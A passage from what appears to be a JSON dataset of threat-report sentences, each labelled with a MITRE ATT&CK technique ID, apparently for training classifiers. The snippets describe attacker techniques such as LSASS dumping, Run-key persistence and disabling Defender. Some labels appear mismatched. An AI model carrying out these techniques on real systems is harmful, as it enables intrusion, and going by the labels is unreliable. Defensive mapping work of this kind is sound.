    "type": "text",
    "text": "starting the RDP session",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has made registry modifications to alter its behavior upon execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has aggregated collected credentials in text files before exfiltrating.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "created a persistence mechanism for NGROK by adding\nVirtualHost.vbs to the WindNT value under the current users Run\nregistry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to search for files on the victims machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to maintain persistence by creating scheduled tasks set to run every hour.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "terminates various services related to system security and Windows.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used valid compromised email accounts for defense evasion including to send malicious emails to other victim organizations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used Android backdoors capable of exfiltrating specific files directly from the infected devices.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware with scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "uses Windows API functions to execute files",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "RDP connections were established from the beachhead host to systems throughout the environment",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has created new services for persistence.(Citation: Securelist Kimsuky Sept 2013)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can receive and execute commands with cmd.exe. It can also provide a reverse shell.(Citation: PWC Cloud Hopper Technical Annex April 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\vert = rundll32.exe c:\\windows\\temp\\pvcu.dll Qszdez.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the scheduled task will trigger 30 minutes after the malware execution.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used ipconfig and arp to determine network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has registered itself as a service to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download files to and from a target machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "17 Complete List of Malware Files  Fig",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a tool that can list out currently running processes.(Citation: FireEye Clandestine Fox)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "After choosing a new server and connecting via RDP,",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "showing the “uninstall” commands for Windows Defender:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "proceeded to dump LSASS memory",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has injected code into a selected process which in turn launches a command as a child process of the original.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used multiple command-line utilities to enumerate running processes.(Citation: Volexity SolarWinds)(Citation: Microsoft Deep Dive Solorigate January 2021)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "System Directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "started a BITS job to download a Cobalt Strike beacon",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "post-exploit tool that leverages HTTP protocols for C2 traffic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malicious actor signing in to a Microsoft 365 account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "It also checks the victim’s hostname",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover the hostname of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can communicate to its C2 over HTTP and HTTPS if directed.(Citation: FireEye APT10 April 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use  to identify running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used ps to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Code injection in LSASS",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to dynamically resolve and use APIs including `SeTakeOwnershipPrivilege`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The batch file would download and execute",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "If the API fails to execute, the malware calls InitiateSystemShutdownExW",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "gathers the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has searched for system version architecture disk partition logical volume and hostname information.(Citation: ATT TeamTNT Chimaera September 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the files are sent through an HTTP POST request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to communicate with its C2 over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.(Citation: ESET OceanLotus)(Citation: Cybereason Oceanlotus May 2017)(Citation: ESET OceanLotus Mar 2019)(Citation: FireEye APT32 April 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Gather domain and account names based on all running processes  Gathering account information from running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.(Citation: Volexity OceanLotus Nov 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the account name on a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has executed file /bin/pwd on exploited victims perhaps to return architecture related information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to add itself to `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift` for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can list information about files in a directory and recently opened or used documents.  can also search for specific files by supplied file mask.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has created a scheduled task to execute a .vbe file multiple times a day.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "launching the getsystem command in the wrong console (shell console rather than the beacon console).",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has run scripts to identify file formats including Microsoft Word.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors obtained and abused credentials of privilege domain accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files and tools onto the victims machine.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "places scripts in the startup folder for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has modified registry keys of ComSysApp Svchost and xmlProv on the machine to gain persistence.(Citation: Medium KONNI Jan 2020) ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download files including second-stage malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses WMI for lateral movement and information gathering.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "performs a reflective DLL injection using a given pid.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "OS version and system type",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The  uploader or malware the uploader uses command to delete the RAR archives after they have been exfiltrated.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "used  to carry out credential dumping using ProcDump.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used domain credentials including domain admin for lateral movement and privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Figure 5 shows Phishery’s output to the command that injects a URL into a file named “good_test.docx”, which it will save the resulting file to “bad_test.docx”",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "to execute malicious code in the context of LSASS.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The following capabilities have been observed in this payload:  Get drive information Modify files Modify directories Modify registry Spawn process Terminate process Modify services Kill self   Ties to SunOrcal Reaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used the RegQueryValueExA function to retrieve proxy information in the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "took place over an unencrypted HTTP channel, the network traffic was plainly visible.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "executes the batch file,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors has used WMI to execute commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can collect files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.(Citation: Unit 42 DarkHydrus July 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "the “UsingTask” element defines the task that will be compiled by MSBuild.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has used stolen credentials to access administrative accounts within the domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used remote code execution to download subsequent payloads.(Citation: FireEye Fin8 May 2016)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP requests for command and control.(Citation: NorthSec 2015 GData Uroburos Tools)(Citation: ESET ComRAT May 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can obtain file and directory information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "deletes the directory with the files causing the errors",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Maintain Presence via Windows Service Installation",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by adding a shortcut of itself to the startup path in the Registry.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "s infpub.dat file creates a scheduled task to launch a malicious executable.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to harvest credentials through LSASS memory dumping.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "TRINITY malware used by  identifies payment card track data on the victim and then copies it to a local file in a subdirectory of C:\\Windows\\.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can launch cmd.exe to execute commands on the system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can receive data and executable scripts from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can inject code into system processes including notepad.exe svchost.exe and vbc.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In other cases, the adversary moved laterally to another system with a domain admin logged in.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "creates a new service named ntssrv to execute the payload. Newer versions create the MaintenaceSrv and hdv_725x services.(Citation: Palo Alto Shamoon Nov 2016)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "allows actors to spawn a reverse shell on a victim.(Citation: Dell TG-3390)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Many of the hosts used to support these second-stage operations hosted RDP services",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "is executed using rundll32.exe.(Citation: F-Secure Sofacy 2015)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can be added as a service to establish persistence.  also has a module to change service configurations as well as start control and delete services.(Citation: CIRCL PlugX March 2013)(Citation: Lastline PlugX Analysis)(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 April 2017)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to steal documents from the local system including the print spooler queue.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "collects processor information memory information computer name hardware UUID serial number and operating system version.  has used the ioreg command to gather some of this information.(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "delete its process file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the internal IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP to retrieve additional binaries.(Citation: Unit 42 NETWIRE April 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "makes extensive use of the Windows API to execute commands and launch processes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can read data from the Registry including from `HKLM\\Software\\NFC\\IPA` and`HKLM\\Software\\NFC\\`.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "scripts save memory dump data into a specific directory on hosts in the victim environment.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "uses POST and GET requests over HTTP to communicate with its main C&C server. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": " lists the running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This produces strings including a commandline usage:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can install additional modules via C2 commands.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Stopping Cisco AMP  Disabling Microsoft Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can gather victim drive information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can terminate a specific process by its process id.(Citation: McAfee Bankshot)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has retrieved DLLs and installer binaries for malware execution from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "78 runin.bin List of processes names and associated plugins should be run inside these processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  to collect information on targeted hosts.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors dropped several batch scripts on the server:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "is capable of modifying the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has a command to list the victim's processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has compromised user credentials and used valid accounts for operations.(Citation: US-CERT TA18-074A)(Citation: Gigamon Berserk Bear October 2021)",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can check for specific processes associated with virtual environments.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This downloader simply downloads the loader",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the victim IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute commands with the COMSPEC environment variable.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use .NET framework APIs",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument dig.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has deployed a tool known as  to the Startup folder of a victim and used Registry run keys to gain persistence.(Citation: Symantec Elfin Mar 2019)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can temporarily store files in a hidden directory on the local host.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a macro function to set scheduled tasks disguised as those used by Google.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "func_ListProcesses()",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "use UltraVNC to download two LNK\nfiles",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version UUID and computer/host name to send to the C2 server.(Citation: Unit 42 Magic Hound Feb 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use Native API to create a new process and to start services.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "with a button, which, when clicked, downloaded a “malicious” ISO file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can collect elements related to credit card data from process memory.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can determine if the current user has admin privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "a check against blacklisted processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Beacon payload can collect information on process details.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "for the infected system by gathering the username and hostname",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional components and malware.(Citation: Trend Micro Qakbot May 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Cyberint Qakbot May 2021)(Citation: Kaspersky QakBot September 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "to enable Remote Desktop sessions (RDP) using reg.exe.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors had to first compromise two privileged accounts and leverage them to manipulate the Azure Active Directory (Azure AD) Connect agent.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to add itself to the Registry Run key for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "deleted the LaZagne binary after execution to avoid detection from the user's side.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "abusing API calls in the Operating System.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used compromised domain accounts to gain access to the target environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can perform OS credential dumping using .",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.(Citation: Palo Alto menuPass Feb 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the attacker's C2 via the HTTP POST method.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has a module to enumerate drives and find files recursively.(Citation: CIRCL PlugX March 2013)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "the malware copied itself to \"$CURRENTUSER\\AppData\\Roaming\\Microsoft\\Isoaahffo\\djkuuhd.dll,\" as confirmed by the file's hashes shown below, and sets itself to auto run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\wbem\\wmic.exe /node",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to upload collected files to a C2.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can create a Startup item for persistence if it determines it is on a Windows system.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files from URLs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present including SecureCRT Terminal Services RealVNC TightVNC UltraVNC Radmin mRemote TeamViewer FileZilla pcAnyware and Remote Desktop. Another  malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Comsvcs.dll is a well-known way to extract LSASS (Local Security Authority Subsystem Service) data",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "executes a batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "using low level APIs: NtCreateSection, NtMapViewOfSection",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has collected files from infected systems and uploaded them to a C2 server.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The user is also asked to permit push notifications in the browser,",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "creates directory listings",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and unfortunately couldn’t restore them after they were deleted",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "invoked from the command line",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "MSBuild has an inline task feature",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Windows Management Instrumentation (WMI) to launch commands on devices",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has has used HTTP GET requests in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "executes, it drops a PHP application with additional files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for network communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Injection type: Current process (1) or in the new process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can search a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can iterate over the running processes to find a suitable injection target.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Write in the registry",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can download files onto the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "File deletion",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.(Citation: Kaspersky Sofacy)(Citation: ESET Sednit Part 2)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used `mdfind` to enumerate a list of apps known to grant screen sharing permissions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "used by various actors to disable endpoint protection tools.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses the command-line interface to execute arbitrary commands.(Citation: McAfee Bankshot)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses local caches to stage data",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "collects information about the Internet adapter configuration.(Citation: Symantec Dragonfly)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has been launched by starting iexplore.exe and replacing it with 's payload.(Citation: Lookout Dark Caracal Jan 2018)(Citation: EFF Manul Aug 2016)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute commands and run scripts on the victim's machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "legitimate WMI persistence",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  to enumerate hosts and gather username machine name and administrative permissions information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate all running processes and process information on an infected machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP and HTTPS in C2 communications.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)(Citation: CISA WellMess July 2020)",
    "command": "",
    "labels": [
      "T1071.001"
